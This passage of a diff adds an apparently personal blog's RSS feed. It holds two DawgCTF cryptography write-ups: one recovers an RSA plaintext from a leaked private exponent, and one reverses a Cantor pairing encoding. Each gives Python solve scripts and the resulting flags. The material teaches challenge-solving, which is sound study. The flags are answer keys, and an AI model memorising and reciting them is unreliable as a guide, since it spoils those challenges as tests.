+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;e = </span><span style="color:#e6db74">{</span>e_pub<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;d = </span><span style="color:#e6db74">{</span>d_pub<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;N = </span><span style="color:#e6db74">{</span>N<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;c = </span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p><strong>e = 58271</strong>
+<strong>d =</strong> <strong>16314065939355844497428646964774413938010062495984944007868244761330321449198604198404787327825341236658059256072790190934480082681534717838850610633320375625893501985237981407305284860652632590435055933317638416556532857376955427517397962124909869006289022084571993305966362498048396739334756594170449299859</strong>
+<strong>N =</strong> <strong>11908266771291549727040770227788674365298563844463718805993868100807705889593534576540716051355511201319075171121352338919492532856516466781757032847478539199285763483256</strong>
+<strong>2389502866385475392702847788337877472422435555825872297998602400341624700149407637506713864175123267515579305109471947679940924817268027249</strong>
+<strong>c =</strong> <strong>1070895821540922853545147589874651120161444554801263669629104142937219656827406742051002228234391509902999896805931793509330204277323867163866850522216802742834694813501</strong>
+<strong>06415150660410528574034324184318354089504379956162660478769613136499331243363223860893663583161020156316072996007464894397755058410931262938</strong></p>
+<p>For this challenge we are requiered to know RSA cryptography and how their public and private keys work.</p>
+<p>A cypher message with RSA is calculated like this, ciphertext = m^e mod n. Where m is
+the plain message, e is the public exponent and n is the product of two large numbers p and q.</p>
+<p>To return to the plain text we have to decrypt it like this m =c^d mod n, where d is the private key.
+d is computed like this d×e ≡ 1 (mod φ(N)). Where φ(N) = (p-1)*(q-1).</p>
+<p>As we said e×d ≡ 1 (mod φ(N)) and we can rearrange it like this: e×d − 1 = k × φ(N) for some small integer k.
+So we need to find a number k that matches (e×d − 1) % k == 0.</p>
+<p>We can use this python script that will try different numbers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>e_public <span style="color:#f92672">=</span> <span style="color:#ae81ff">58271</span>
+</span></span><span style="display:flex;"><span>d_public <span style="color:#f92672">=</span> <span style="color:#ae81ff">16314065939355844497428646964774413938010062495984944007868244761330321449198604198404787327825341236658059256072790190934480082681534717838850610633320375625893501985237981407305284860652632590435055933317638416556532857376955427517397962124909869006289022084571993305966362498048396739334756594170449299859</span>
+</span></span><span style="display:flex;"><span>N <span style="color:#f92672">=</span> <span style="color:#ae81ff">119082667712915497270407702277886743652985638444637188059938681008077058895935345765407160513555112013190751711213523389194925328565164667817570328474785391992857634832562389502866385475392702847788337877472422435555825872297998602400341624700149407637506713864175123267515579305109471947679940924817268027249</span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">107089582154092285354514758987465112016144455480126366962910414293721965682740674205100222823439150990299989680593179350933020427732386716386685052221680274283469481350106415150660410528574034324184318354089504379956162660478769613136499331243363223860893663583161020156316072996007464894397755058410931262938</span>
+</span></span><span style="display:flex;"><span>e_private <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10001</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>phiNxK <span style="color:#f92672">=</span> e_public <span style="color:#f92672">*</span> d_public <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1000000</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(phiNxK <span style="color:#f92672">%</span> k) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        Dprivate <span style="color:#f92672">=</span> pow(e_private, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, phiNxK<span style="color:#f92672">//</span>k)
+</span></span><span style="display:flex;"><span>        m <span style="color:#f92672">=</span> long_to_bytes(pow(c,Dprivate,N))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;mensaje: </span><span style="color:#e6db74">{</span>(m)<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span></code></pre></div><p><strong>DawgCTF{kn0w1ng_d_1s_kn0w1ng_f4ct0rs}</strong></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>[Cryptography] Cantors Pairadox</title>
+            <link>http://localhost:1313/webPablo/posts/dawgctf/cantorspairadox/</link>
+            <pubDate>Sat, 19 Apr 2025 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/webPablo/posts/dawgctf/cantorspairadox/</guid>
+            <description>Challenge: Now that I have encrypted my flag with a new math function I was just researching I can know share it with my friend Cantor and no one will know how to read it except us!
+For this we are given 2 files. The first one is a .txt containing the following:
+flag = 4036872197130975885183239290191447112180924008343518098638033545 53589334888434826276681036070738374179472139222629149731482620127084778 4737584016
+And the other one is a python file:
+from sage.all import sqrt, floor from secret import flag def getTriNumber(n): return n * (n + 1) // 2 # Ensure integer division def pair(n1, n2): S = n1 + n2 return getTriNumber(S) + n2 def pair_array(arr): result = [] for i in range(0, len(arr), 2): result.</description>
+            <content type="html"><![CDATA[<p>Challenge:
+<strong>Now that I have encrypted my flag with a new math function</strong>
+<strong>I was just researching I can know share it with my friend Cantor</strong>
+<strong>and no one will know how to read it except us!</strong></p>
+<p>For this we are given 2 files. The first one is a .txt containing
+the following:</p>
+<p><strong>flag = 4036872197130975885183239290191447112180924008343518098638033545
+53589334888434826276681036070738374179472139222629149731482620127084778
+4737584016</strong></p>
+<p>And the other one is a python file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> sage.all <span style="color:#f92672">import</span> sqrt, floor
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> secret <span style="color:#f92672">import</span> flag
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getTriNumber</span>(n):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> n <span style="color:#f92672">*</span> (n <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>  <span style="color:#75715e"># Ensure integer division</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pair</span>(n1, n2):
+</span></span><span style="display:flex;"><span>    S <span style="color:#f92672">=</span> n1 <span style="color:#f92672">+</span> n2
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> getTriNumber(S) <span style="color:#f92672">+</span> n2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pair_array</span>(arr):
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(arr), <span style="color:#ae81ff">2</span>):
+</span></span><span style="display:flex;"><span>        result<span style="color:#f92672">.</span>append(pair(arr[i], arr[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]))    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pad_to_power_of_two</span>(arr):
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> arr
+</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> len(result)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (n <span style="color:#f92672">&amp;</span> (n <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        result<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>        n <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> [ord(f) <span style="color:#66d9ef">for</span> f <span style="color:#f92672">in</span> flag]  
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> pad_to_power_of_two(flag)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>temp <span style="color:#f92672">=</span> flag
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+</span></span><span style="display:flex;"><span>    temp <span style="color:#f92672">=</span> pair_array(temp)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Encoded:&#34;</span>, temp)
+</span></span></code></pre></div><p>Lets start by analizing what it does.</p>
+<p>First of all the variable containing the flag is converted to ASCII
+(example: &ldquo;flag&rdquo;-&gt;[102, 108, 97, 103]) and then pad_to_power_of_two() is called.
+This function just adds zeros to the right until the length is a power
+of 2. For example if it was [1,2,3] (length 3) it would convert it to
+[1,2,3,0] (lenght 4 = 2²).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> [ord(f) <span style="color:#66d9ef">for</span> f <span style="color:#f92672">in</span> flag]  
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> pad_to_power_of_two(flag)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pad_to_power_of_two</span>(arr):
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> arr
+</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> len(result)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (n <span style="color:#f92672">&amp;</span> (n <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        result<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>        n <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
+</span></span></code></pre></div><p>Then the variable is passed into pair_array() 6 times. This function
+iterates over the temp variable and and passes to the function pair()
+two consecutive numbers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>temp <span style="color:#f92672">=</span> flag
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+</span></span><span style="display:flex;"><span>    temp <span style="color:#f92672">=</span> pair_array(temp)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pair_array</span>(arr):
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(arr), <span style="color:#ae81ff">2</span>):
+</span></span><span style="display:flex;"><span>        result<span style="color:#f92672">.</span>append(pair(arr[i], arr[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]))    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
+</span></span></code></pre></div><p>Lets forget about the function pair() and dive deep into pair_array(),
+if we had this list [2, 4, 5, 7] what pair_array() would do is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>result<span style="color:#f92672">.</span>append(pair(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">4</span>))
+</span></span><span style="display:flex;"><span>result<span style="color:#f92672">.</span>append(pair(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">7</span>))
+</span></span></code></pre></div><p>So we are converting 2 concatenate numbers into 1 and
+doing that 6 times. If we were to do it again with our example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> pair(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> pair(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">7</span>)
+</span></span><span style="display:flex;"><span>result<span style="color:#f92672">.</span>append(pair(a, b))
+</span></span></code></pre></div><p>Like this we can convert 4 numbers into just one. Now lets look at how
+that unique number is calculated. First we add both numbers (S = n1 + n2) and we return
+the triangular number of S + n2.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getTriNumber</span>(n):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> n <span style="color:#f92672">*</span> (n <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>  <span style="color:#75715e"># Ensure integer division</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pair</span>(n1, n2):
+</span></span><span style="display:flex;"><span>    S <span style="color:#f92672">=</span> n1 <span style="color:#f92672">+</span> n2
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> getTriNumber(S) <span style="color:#f92672">+</span> n2
+</span></span></code></pre></div><p>This is the Cantor pairing function (the statement gives us a hint). So lets
+take a look at how our list would work with this pairing.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>result<span style="color:#f92672">.</span>append(pair(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">4</span>))
+</span></span><span style="display:flex;"><span>result<span style="color:#f92672">.</span>append(pair(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">7</span>))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Result: </span><span style="color:#e6db74">{</span>result<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>-&gt; Result: [25, 85]</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>result<span style="color:#f92672">.</span>append(pair(<span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">85</span>))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Result: </span><span style="color:#e6db74">{</span>result<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>-&gt; Result: [6190]</p>
+<p>And that is how we converted 4 numbers -&gt; 2 numbers -&gt; 1 number, iterating
+2 times.</p>
+<p>There is a formula to reverse this pairing and this is how it looks
+in Python.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> sympy <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getTriNumber</span>(n):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> n <span style="color:#f92672">*</span> (n <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unpair</span>(z):
+</span></span><span style="display:flex;"><span>    w <span style="color:#f92672">=</span> floor((sqrt(<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span>z <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    t <span style="color:#f92672">=</span> getTriNumber(w)
+</span></span><span style="display:flex;"><span>    n2 <span style="color:#f92672">=</span> z <span style="color:#f92672">-</span> t
+</span></span><span style="display:flex;"><span>    n1 <span style="color:#f92672">=</span> w <span style="color:#f92672">-</span> n2
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> n1, n2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unpair_array</span>(arr):
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> arr:
+</span></span><span style="display:flex;"><span>        a, b <span style="color:#f92672">=</span> unpair(z)
+</span></span><span style="display:flex;"><span>        result<span style="color:#f92672">.</span>append(a)
+</span></span><span style="display:flex;"><span>        result<span style="color:#f92672">.</span>append(b)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
+</span></span></code></pre></div><p>Now with all this we just need to call unpair_array() 6 times
+with the number we were provided and we will have the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> sympy <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getTriNumber</span>(n):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> n <span style="color:#f92672">*</span> (n <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unpair</span>(z):
+</span></span><span style="display:flex;"><span>    w <span style="color:#f92672">=</span> floor((sqrt(<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span>z <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    t <span style="color:#f92672">=</span> getTriNumber(w)
+</span></span><span style="display:flex;"><span>    n2 <span style="color:#f92672">=</span> z <span style="color:#f92672">-</span> t
+</span></span><span style="display:flex;"><span>    n1 <span style="color:#f92672">=</span> w <span style="color:#f92672">-</span> n2
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> n1, n2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unpair_array</span>(arr):
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> arr:
+</span></span><span style="display:flex;"><span>        a, b <span style="color:#f92672">=</span> unpair(z)
+</span></span><span style="display:flex;"><span>        result<span style="color:#f92672">.</span>append(a)
+</span></span><span style="display:flex;"><span>        result<span style="color:#f92672">.</span>append(b)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 1: the number we were given</span>
+</span></span><span style="display:flex;"><span>encoded_value <span style="color:#f92672">=</span> [<span style="color:#ae81ff">4036872197130975885183239290191447112180924008343518098638033545535893348884348262766810360707383741794721392226291497314826201270847784737584016</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2: unpair 6 times</span>
+</span></span><span style="display:flex;"><span>temp <span style="color:#f92672">=</span> encoded_value
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+</span></span><span style="display:flex;"><span>    temp <span style="color:#f92672">=</span> unpair_array(temp)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 3: to eliminate the zeros that were added when the</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># length was converted to the power of 2 (this is not neccesary)</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> temp <span style="color:#f92672">and</span> temp[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>    temp<span style="color:#f92672">.</span>pop()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 4: convert to text</span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> temp)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Decoded flag:&#34;</span>, flag)
+</span></span></code></pre></div><p><strong>Dawg{1_pr3f3r_4ppl3s_t0_pa1rs_4nyw2y5}</strong></p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
